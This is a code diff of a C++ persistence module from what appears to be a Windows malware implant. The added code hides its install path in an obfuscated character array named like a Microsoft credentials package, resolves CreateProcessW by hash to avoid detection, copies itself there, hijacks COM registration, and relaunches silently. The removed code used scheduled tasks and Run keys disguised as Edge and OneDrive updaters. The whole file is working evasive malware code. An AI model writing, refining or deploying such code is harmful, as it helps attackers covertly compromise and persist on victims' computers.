@@ -1,115 +1,134 @@
 #include "Persistence.h"
-
+#include "ComHijacker.h"
+#include "../evasion/Syscalls.h"
 #include <windows.h>
 #include <string>
 #include <vector>
 #include <random>
+#include <rpc.h>
+#pragma comment(lib, "rpcrt4.lib")
 
 namespace persistence {
+
+namespace {
+// XOR helper
+std::string xorDecrypt(const std::string& enc, BYTE key) {
+    std::string dec = enc;
+    for (char& c : dec) c ^= key;
+    return dec;
+}
+
+std::string generateRandomClsid() {
+    UUID uuid;
+    UuidCreate(&uuid);
+    char* str;
+    UuidToStringA(&uuid, (RPC_CSTR*)&str);
+    std::string clsid = "{" + std::string(str) + "}";
+    RpcStringFreeA((RPC_CSTR*)&str);
+    return clsid;
+}
+
+// djb2 hash impl
+DWORD djb2Hash(const char* str) {
+    DWORD hash = 5381;
+    int c;
+    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
+    return hash;
+}
+
+// getProcByHash (scan export table)
+PVOID getProcByHash(HMODULE mod, DWORD targetHash) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)mod;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)mod + dosHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    DWORD* names = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames);
+    WORD* ordinals = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        if (djb2Hash((char*)mod + names[i]) == targetHash) {
+            return (PVOID)((BYTE*)mod + funcs[ordinals[i]]);
+        }
+    }
+    return NULL;
+}
+}
 
 namespace {
 
 bool isAdmin() {
     BOOL is_admin = FALSE;
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
-    PSID AdministratorsGroup = nullptr;
-
-    if (AllocateAndInitializeSid(
-            &NtAuthority,
-            2,
-            SECURITY_BUILTIN_DOMAIN_RID,
-            DOMAIN_ALIAS_RID_ADMINS,
-            0, 0, 0, 0, 0, 0,
-            &AdministratorsGroup)) {
-
-        CheckTokenMembership(nullptr, AdministratorsGroup, &is_admin);
+    PSID AdministratorsGroup;
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
+        CheckTokenMembership(NULL, AdministratorsGroup, &is_admin);
         FreeSid(AdministratorsGroup);
     }
-
     return is_admin == TRUE;
 }
 
 std::wstring getExecutablePath() {
     std::vector<wchar_t> path_buf;
     DWORD copied = 0;
-
     do {
         path_buf.resize(path_buf.size() + MAX_PATH);
         copied = GetModuleFileNameW(NULL, path_buf.data(), static_cast<DWORD>(path_buf.size()));
     } while (copied >= path_buf.size());
-
     path_buf.resize(copied);
     return std::wstring(path_buf.begin(), path_buf.end());
 }
 
-} // anonymous namespace
+std::wstring getPersistencePath() {
+    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
+    wchar_t expanded[MAX_PATH];
+    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
+    std::wstring userPersistPath = expanded;
+    std::wstring fileName = L"\\auth.dll";
+    return userPersistPath + fileName;
+}
 
+} // namespace
+bool isRunningFromPersistence() {
+    std::wstring sourcePath = getExecutablePath();
+    std::wstring persistPath = getPersistencePath();
+    return lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0;
+}
 void establishPersistence() {
     std::wstring sourcePath = getExecutablePath();
-
-    const wchar_t* adminPath = L"%PROGRAMDATA%\\Microsoft\\Windows\\Containers";
-    const wchar_t* userPath  = L"%LOCALAPPDATA%\\Microsoft\\Vault";
-
-    std::vector<const wchar_t*> dynamicNames = {
-        L"vaultsvc.exe",
-        L"edgeupdate.exe",
-        L"onedrivesync.exe",
-        L"msteamsupdate.exe"
-    };
-
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    std::uniform_int_distribution<> distrib(0, static_cast<int>(dynamicNames.size() - 1));
-    const wchar_t* persistFilename = dynamicNames[distrib(gen)];
-
-    const wchar_t* persistDir = isAdmin() ? adminPath : userPath;
-
-    wchar_t expandedDir[MAX_PATH]{};
-    ExpandEnvironmentStringsW(persistDir, expandedDir, MAX_PATH);
-
-    std::wstring persistPath =
-        std::wstring(expandedDir) + L"\\" + persistFilename;
+    std::wstring persistPath = getPersistencePath();
 
     if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
         return; // Already running from persistence location
     }
 
-    CreateDirectoryW(expandedDir, nullptr);
+    wchar_t userPathArr[] = { L'%', L'L', L'O', L'C', L'A', L'L', 'A', L'P', 'P', 'D', 'A', 'T', 'A', L'%', L'\\', L'P', L'a', L'c', L'k', L'a', L'g', L'e', L's', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'.', L'C', L'r', 'e', L'd', L'e', L'n', L't', L'i', L'a', L'l', L's', 0 };
+    wchar_t expanded[MAX_PATH];
+    ExpandEnvironmentStringsW(userPathArr, expanded, MAX_PATH);
+    CreateDirectoryW(expanded, NULL);
     CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
 
-    if (isAdmin()) {
-        std::wstring command =
-            L"schtasks /Create /TN MicrosoftEdgeUpdateTaskMachineUA "
-            L"/TR \"" + persistPath +
-            L"\" /SC ONLOGON /RL HIGHEST /F";
-
-        STARTUPINFOW si{};
-        PROCESS_INFORMATION pi{};
-        si.cb = sizeof(si);
-
-        if (CreateProcessW(
-                nullptr,
-                &command[0],
-                nullptr,
-                nullptr,
-                FALSE,
-                CREATE_NO_WINDOW,
-                nullptr,
-                nullptr,
-                &si,
-                &pi)) {
-
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        }
-    } else {
-        // Use registry run key
-        HKEY hKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"OneDriveStandaloneUpdater", 0, REG_SZ, (const BYTE*)persistPath.c_str(), static_cast<DWORD>((persistPath.size() + 1) * sizeof(wchar_t)));
-            RegCloseKey(hKey);
-        }
+    if (!isAdmin()) {
+        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), NULL, 0, NULL, NULL);
+        std::string implantPath(size_needed, 0);
+        WideCharToMultiByte(CP_UTF8, 0, &persistPath[0], (int)persistPath.size(), &implantPath[0], size_needed, NULL, NULL);
+        std::string clsid = generateRandomClsid();
+        persistence::ComHijacker::Install(implantPath, clsid);
     }
+
+    // Launch the newly persisted executable
+    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
+    using CreateProc = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+    DWORD hash = djb2Hash("CreateProcessW");
+    CreateProc pCreate = (CreateProc)getProcByHash(hKernel, hash);
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    pCreate(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
 
 } // namespace persistence
